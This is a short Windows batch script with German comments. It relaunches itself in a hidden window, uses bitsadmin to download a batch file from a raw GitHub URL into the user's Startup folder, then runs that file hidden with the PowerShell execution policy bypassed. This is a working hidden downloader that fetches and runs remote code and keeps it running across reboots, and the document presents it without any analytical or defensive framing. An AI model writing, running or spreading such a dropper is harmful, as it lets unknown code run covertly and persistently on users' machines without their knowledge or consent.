@echo off

:: Zielordner definieren
set "zielordner=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
set "url=https://raw.githubusercontent.com/max65481/88/refs/heads/main/Programm_welches_das_eigentliche_Autostartet.bat"
set "dateiname=Programm_welches_das_eigentliche_Autostartet.bat"

:: Prüfen, ob die Batch-Datei bereits versteckt läuft
if "%1"=="hidden" goto hidden

:: Diese Zeile startet die Batch-Datei versteckt
powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -ArgumentList 'hidden' -WindowStyle Hidden"
exit

:hidden
:: Ab hier läuft der Code unsichtbar

:: Datei wird heruntergeladen
echo Datei wird heruntergeladen: %url%
bitsadmin /transfer "DownloadJob" "%url%" "%zielordner%\%dateiname%"

:: Prüfen, ob der Download erfolgreich war
if exist "%zielordner%\%dateiname%" (
    echo Download erfolgreich! Datei gespeichert unter "%zielordner%\%dateiname%"
) else (
    echo Fehler: Die Datei konnte nicht heruntergeladen werden.
    exit /b
)

:: Datei im Autostart-Ordner ausführen
echo Starte %dateiname%...
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "%zielordner%\%dateiname%"

:: Optional: Bei Erfolg oder Fehler Nachricht anzeigen
if %errorlevel% equ 0 (
    echo Die Batch-Datei wurde erfolgreich gestartet.
) else (
    echo Es gab ein Problem beim Starten der Batch-Datei.
)

exit
